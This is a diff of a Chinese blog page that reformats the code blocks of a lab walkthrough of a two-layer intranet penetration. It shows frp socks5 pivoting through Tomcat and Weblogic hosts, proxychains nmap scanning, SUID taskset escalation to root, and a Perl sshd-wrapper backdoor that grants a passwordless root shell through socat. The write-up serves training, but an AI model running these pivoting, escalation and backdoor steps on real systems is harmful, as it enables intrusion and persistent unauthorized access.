 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/32.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
 <p>上传<code>ladon64</code>检测工具，获取内网存活主机<code>IP</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">chmod +x ladon64</span><br><span class="line">./ladon64 172.26.0.0/24 icmpscan</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">cd /tmp
+chmod +x ladon64
+./ladon64 172.26.0.0/24 icmpscan</code></pre>
 
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/33.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
@@ -792,24 +819,47 @@
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/34.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
 <p>修改<code>frpc.ini</code>为如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 172.22.0.10</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5_2]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 6666</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">[common]
+server_addr = 172.22.0.10
+server_port = 7000
+
+[socks5_2]
+type = tcp
+plugin = socks5
+remote_port = 6666</code></pre>
 
 <p><code>Tomcat</code>服务器新建<code>frpc2.ini</code>配置文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 10.1.1.119</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5_1]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 5000</span><br><span class="line"></span><br><span class="line">[socks5_to_26]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 6666</span><br><span class="line">remote_port = 6000</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">[common]
+server_addr = 10.1.1.119
+server_port = 7000
+
+[socks5_1]
+type = tcp
+plugin = socks5
+remote_port = 5000
+
+[socks5_to_26]
+type = tcp
+local_ip = 127.0.0.1
+local_port = 6666
+remote_port = 6000</code></pre>
 
 <p>以<code>Tomcat</code>服务器为跳板机，转发从攻击机的6000端口传输过来的流量请求到本地的<code>6666</code>端口，而本地的<code>6666</code>端口为<code>Tomcat</code>与<code>Weblogic</code>服务器之间建立的<code>socks</code>代理通道的入口，也就相当于，把外网的请求流量，通过<code>Tomcat</code>跳板机，转发到<code>Weblogic</code>服务器所在的二层内网。</p>
 <p><code>Tomcat</code>服务器在运行<code>frpc</code>之前，需要先把之前建立一层<code>socks5</code>代理时启动的<code>frpc</code>进程停止，然后再用如下命令指定新的<code>frpc</code>配置文件启动新的<code>frpc</code>进程</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">ps -elf|grep frpc</span><br><span class="line">kill 89		</span><br><span class="line">./frpc -c frpc2.ini</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">cd /tmp
+ps -elf|grep frpc
+kill 89		
+./frpc -c frpc2.ini</code></pre>
 
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/35.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
 <p>为了建立二层socks5代理，需要在Tomcat服务器上启动一个frps服务端，然后在Weblogic服务器上启动连接此frps的frpc客户端，从而使Tomcat与Weblogic服务器之间建立一个socks5代理通道，用于流量数据传输。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">./frps -c frps.ini</code></pre>
 
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/36.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
 <p>Weblogic服务器客户端连接Tomcat服务器启动的frps服务端，建立socks5代理通道，代理通道入口为Tomcat服务器的6666端口：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">./frpc -c frpc.ini</code></pre>
 
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/37.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
@@ -817,49 +867,59 @@
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/38.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
 <p>从处于外网的攻击机上发送到二层内网网段<code>172.26.0.0/16</code>的请求数据，其数据流向为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attack攻击机 --&gt; socks5:127.0.0.1:6000 --&gt; tomcat服务器 --&gt; socks5:127.0.0.1:6666 --&gt; Weblogic服务器 --&gt; Dev服务器</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">attack攻击机 --&gt; socks5:127.0.0.1:6000 --&gt; tomcat服务器 --&gt; socks5:127.0.0.1:6666 --&gt; Weblogic服务器 --&gt; Dev服务器</code></pre>
 
 <p>攻击机配置<code>proxychains</code>代理访问二层内网主机，编辑<code>proxychains</code>配置文件</p>
 <p>注释掉末尾之前的<code>socks5</code>代理配置，添加如下配置内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 6000</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">socks5 127.0.0.1 6000</code></pre>
 
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/39.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
 <p>通过<code>socks</code>代理工具，代理<code>nmap</code>流量到内网，对二层内网主机开放的端口进行端口扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT -T4 172.26.0.30</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">proxychains nmap -Pn -sT -T4 172.26.0.30</code></pre>
 
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/40.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
 <p>发现开放远程连接<code>SSH</code>端口<code>22</code></p>
 <h1 id="实验步骤十-获得二层内网主机的普通用户访问权限"><a href="#实验步骤十-获得二层内网主机的普通用户访问权限" class="headerlink" title="实验步骤十 &gt;&gt;&gt; 获得二层内网主机的普通用户访问权限"></a>实验步骤十 &gt;&gt;&gt; 获得二层内网主机的普通用户访问权限</h1><p>清空known_hosts文件内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &gt; /root/.ssh/known_hosts</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">echo &gt; /root/.ssh/known_hosts</code></pre>
 
 <p>通过<code>proxychains</code>工具代理SSH连接二层内网<code>dev</code>服务器：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh simadmin@172.26.0.30</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">proxychains ssh simadmin@172.26.0.30</code></pre>
 
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/41.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
 <p>echo命令可能不成功，手动清理一下known_hosts文件内容</p>
 <p>连接后默认是<code>sh shell</code>外壳，切换为<code>bash shell</code>外壳，会更方便操作：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">bash</code></pre>
 
 <p>查找系统中所有具有<code>SUID</code>权限的文件，发现存在拥有<code>SUID</code>特殊权限的程序<code>taskset</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">find / -perm -u=s -type f</code></pre>
 
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/42.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
 <h1 id="实验步骤十一-权限提升（Root权限）"><a href="#实验步骤十一-权限提升（Root权限）" class="headerlink" title="实验步骤十一 &gt;&gt;&gt; 权限提升（Root权限）"></a>实验步骤十一 &gt;&gt;&gt; 权限提升（Root权限）</h1><p>利用具有<code>SUID</code>权限的<code>taskset</code>从<code>simadmin</code>普通用户权限提权到<code>root</code>权限；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -la /usr/bin/taskset</span><br><span class="line">whoami					</span><br><span class="line">taskset 1 /bin/bash -p</span><br><span class="line">whoami					</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">ls -la /usr/bin/taskset
+whoami					
+taskset 1 /bin/bash -p
+whoami</code></pre>
 
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/43.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC">\</p>
 
 <h1 id="实验步骤十二-权限持久化（后门）"><a href="#实验步骤十二-权限持久化（后门）" class="headerlink" title="实验步骤十二 &gt;&gt;&gt; 权限持久化（后门）"></a>实验步骤十二 &gt;&gt;&gt; 权限持久化（后门）</h1><p>利用<code>SSH Server Wrapper</code>技术，在<code>dev</code>服务器留下<code>SSH</code>登录后门，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/sbin/</span><br><span class="line">mv sshd ../bin</span><br><span class="line">echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br><span class="line">echo &#x27;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..LF/);&#x27; &gt;&gt;sshd</span><br><span class="line">echo &#x27;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">cd /usr/sbin/
+mv sshd ../bin
+echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd
+echo &#x27;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..LF/);&#x27; &gt;&gt;sshd
+echo &#x27;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27; &gt;&gt;sshd
+chmod u+x sshd</code></pre>
 
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/44.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
 <p>可无需密码获得目标主机<code>root</code>用户权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;ls&quot; | socat STDIO TCP4:172.26.0.30:22,sourceport=19526</span><br><span class="line">echo &quot;whoami&quot; | socat STDIO TCP4:172.26.0.30:22,sourceport=19526</span><br><span class="line">echo &quot;ip addr&quot; | socat STDIO TCP4:172.26.0.30:22,sourceport=19526</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">echo &quot;ls&quot; | socat STDIO TCP4:172.26.0.30:22,sourceport=19526
+echo &quot;whoami&quot; | socat STDIO TCP4:172.26.0.30:22,sourceport=19526
+echo &quot;ip addr&quot; | socat STDIO TCP4:172.26.0.30:22,sourceport=19526</code></pre>
 
 <p>因为中国蚁剑的模拟终端会自动的把进程放到后台，因此无法直接在终端中与后门进行命令交互，这里采用管道<code>|</code>的方法，把要执行的命令重定向到与后门的连接中，并返回执行后的结果：</p>
 <p>因为每执行一次命令需要连接我们的后门，然后执行命令，返回结果，因此在执行下个命令时，需要稍微等待几秒时间，等待上次连接关闭，然后才能继续执行命令，否则会出现如下图所示错误：<code>Address already in use</code>。</p>
@@ -1022,7 +1082,7 @@
 				var argonEnableCodeHighlight = true;
 			</script>
 			
-<link rel="stylesheet" href="/assets/vendor/highlight/styles/vs2015.css">
+<link rel="stylesheet" href="/assets/vendor/highlight/styles/github.css">
 
 		
 
